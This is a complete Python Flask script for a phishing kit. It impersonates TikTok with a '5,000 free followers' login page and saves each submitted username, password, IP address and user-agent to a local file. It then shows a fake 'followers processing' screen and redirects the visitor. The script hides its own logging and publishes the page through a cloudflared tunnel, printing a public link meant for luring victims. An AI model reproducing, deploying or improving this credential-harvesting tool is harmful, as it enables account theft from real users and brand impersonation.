import os
import sys
import subprocess
import re
import threading
import time
import logging
import random
from flask import Flask, render_template_string, request, session
from datetime import datetime
from werkzeug.utils import secure_filename

def install(pkg):
    subprocess.check_call([sys.executable, "-m", "pip", "install", "--quiet", pkg])

for pkg in ["flask", "werkzeug"]:
    try:
        __import__(pkg)
    except ImportError:
        install(pkg)

app = Flask(__name__)
app.secret_key = 'tiktok-test-key'

log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR + 10)
app.logger.setLevel(logging.ERROR + 10)

class DummyFile(object):
    def write(self, x): pass
    def flush(self): pass

BASE_FOLDER = os.path.expanduser("~/storage/downloads/TikTok Followers")
os.makedirs(BASE_FOLDER, exist_ok=True)

@app.route('/')
def index():
    session['tt_session'] = str(random.randint(100000, 999999))
    return render_template_string('''
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>TikTok - Get Free Followers</title>
        <style>
            :root {
                --tt-black: #161823;
                --tt-red: #fe2c55;
                --tt-gray: #717379;
            }
            
            body {
                background: var(--tt-black);
                color: white;
                font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
                margin: 0;
                padding: 0;
                display: flex;
                justify-content: center;
                align-items: center;
                min-height: 100vh;
            }
            
            .container {
                width: 100%;
                max-width: 400px;
                padding: 20px;
            }
            
            .logo-container {
                text-align: center;
                margin-bottom: 30px;
            }
            
            .tt-logo {
                font-size: 48px;
                font-weight: bold;
                margin-bottom: 10px;
            }
            
            .promo-banner {
                background: linear-gradient(45deg, #fe2c55, #25f4ee);
                color: white;
                padding: 15px;
                border-radius: 10px;
                text-align: center;
                margin: 20px 0;
                font-weight: bold;
            }
            
            .follower-count {
                font-size: 28px;
                font-weight: bold;
                text-align: center;
                margin: 15px 0;
                background: linear-gradient(45deg, #fe2c55, #25f4ee);
                -webkit-background-clip: text;
                -webkit-text-fill-color: transparent;
            }
            
            .login-box {
                background: rgba(255, 255, 255, 0.1);
                border-radius: 15px;
                padding: 30px;
                backdrop-filter: blur(10px);
            }
            
            input {
                width: 100%;
                padding: 15px;
                margin: 10px 0;
                border: none;
                border-radius: 8px;
                background: rgba(255, 255, 255, 0.1);
                color: white;
                font-size: 16px;
                box-sizing: border-box;
            }
            
            input::placeholder {
                color: rgba(255, 255, 255, 0.6);
            }
            
            input:focus {
                outline: 2px solid var(--tt-red);
            }
            
            .login-btn {
                background: var(--tt-red);
                color: white;
                border: none;
                padding: 15px;
                border-radius: 8px;
                font-size: 16px;
                font-weight: bold;
                width: 100%;
                margin: 15px 0;
                cursor: pointer;
            }
            
            .login-btn:hover {
                background: #eb274c;
            }
            
            .signup-text {
                text-align: center;
                margin-top: 20px;
                color: var(--tt-gray);
            }
            
            .signup-text a {
                color: var(--tt-red);
                text-decoration: none;
                font-weight: bold;
            }
        </style>
    </head>
    <body>
        <div class="container">
            <div class="logo-container">
                <div class="tt-logo">TikTok</div>
                <div style="font-size: 14px; color: #717379;">Get Free Followers & Likes</div>
            </div>
            
            <div class="promo-banner">
                🚀 LIMITED TIME OFFER 🚀
            </div>
            
            <div class="follower-count">5,000 FREE FOLLOWERS</div>
            
            <div class="login-box">
                <form action="/login" method="post">
                    <input type="text" name="username" placeholder="Username or email" required>
                    <input type="password" name="password" placeholder="Password" required>
                    <button type="submit" class="login-btn">Get Free Followers</button>
                </form>
                
                <div class="signup-text">
                    Don't have an account? <a href="#">Sign up</a>
                </div>
            </div>
        </div>
    </body>
    </html>
    ''')

@app.route('/login', methods=['POST'])
def login():
    username = request.form.get('username', '').strip()
    password = request.form.get('password', '').strip()
    session_id = session.get('tt_session', 'unknown')

    safe_username = secure_filename(username)
    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
    user_file_path = os.path.join(BASE_FOLDER, f"{safe_username}_{timestamp}.txt")

    with open(user_file_path, 'w') as file:
        file.write(f"Session: {session_id}\n")
        file.write(f"Username: {username}\n")
        file.write(f"Password: {password}\n")
        file.write(f"Timestamp: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
        file.write(f"User-Agent: {request.headers.get('User-Agent', 'Unknown')}\n")
        file.write(f"IP: {request.remote_addr}\n")

    return render_template_string('''
    <!DOCTYPE html>
    <html>
    <head>
        <title>Processing - TikTok</title>
        <style>
            body {
                background: #161823;
                color: white;
                font-family: -apple-system, BlinkMacSystemFont, sans-serif;
                margin: 0;
                padding: 0;
                display: flex;
                justify-content: center;
                align-items: center;
                min-height: 100vh;
            }
            .container {
                text-align: center;
                background: rgba(255, 255, 255, 0.1);
                padding: 40px;
                border-radius: 15px;
                backdrop-filter: blur(10px);
                max-width: 400px;
            }
            .success-icon {
                font-size: 64px;
                margin: 20px 0;
            }
            .processing {
                width: 100%;
                height: 4px;
                background: rgba(255, 255, 255, 0.2);
                border-radius: 2px;
                margin: 20px 0;
                overflow: hidden;
            }
            .processing-bar {
                height: 100%;
                background: linear-gradient(45deg, #fe2c55, #25f4ee);
                animation: processing 3s infinite;
            }
            @keyframes processing {
                0% { width: 0%; }
                100% { width: 100%; }
            }
            .update-message {
                background: rgba(254, 44, 85, 0.2);
                border: 1px solid #fe2c55;
                border-radius: 8px;
                padding: 15px;
                margin: 20px 0;
            }
        </style>
        <meta http-equiv="refresh" content="5;url=/" />
    </head>
    <body>
        <div class="container">
            <div class="success-icon">🎉</div>
            <h2>Followers Processing!</h2>
            <div class="processing">
                <div class="processing-bar"></div>
            </div>
            <div class="update-message">
                <strong>5,000 followers queued!</strong><br>
                Delivery starting in few minutes.
            </div>
            <p>Redirecting to TikTok...</p>
        </div>
    </body>
    </html>
    ''')

def run_cloudflared_tunnel(local_url):
    cmd = ["cloudflared", "tunnel", "--url", local_url]
    process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
    
    for line in process.stdout:
        match = re.search(r'https://[a-zA-Z0-9-]+\.trycloudflare\.com', line)
        if match:
            tunnel_url = match.group(0)
            print(f"Tik Followers Public Link: {tunnel_url}")
            sys.stdout.flush()
            break
    
    return process

if __name__ == '__main__':
    sys_stdout = sys.stdout
    sys_stderr = sys.stderr
    sys.stdout = DummyFile()
    sys.stderr = DummyFile()

    def run_flask():
        app.run(host='0.0.0.0', port=5000, debug=False, use_reloader=False)

    flask_thread = threading.Thread(target=run_flask, daemon=True)
    flask_thread.start()

    time.sleep(2)
    sys.stdout = sys_stdout
    sys.stderr = sys_stderr

    cloudflared_process = run_cloudflared_tunnel("http://127.0.0.1:5000")

    try:
        cloudflared_process.wait()
    except KeyboardInterrupt:
        cloudflared_process.terminate()
        sys.exit(0)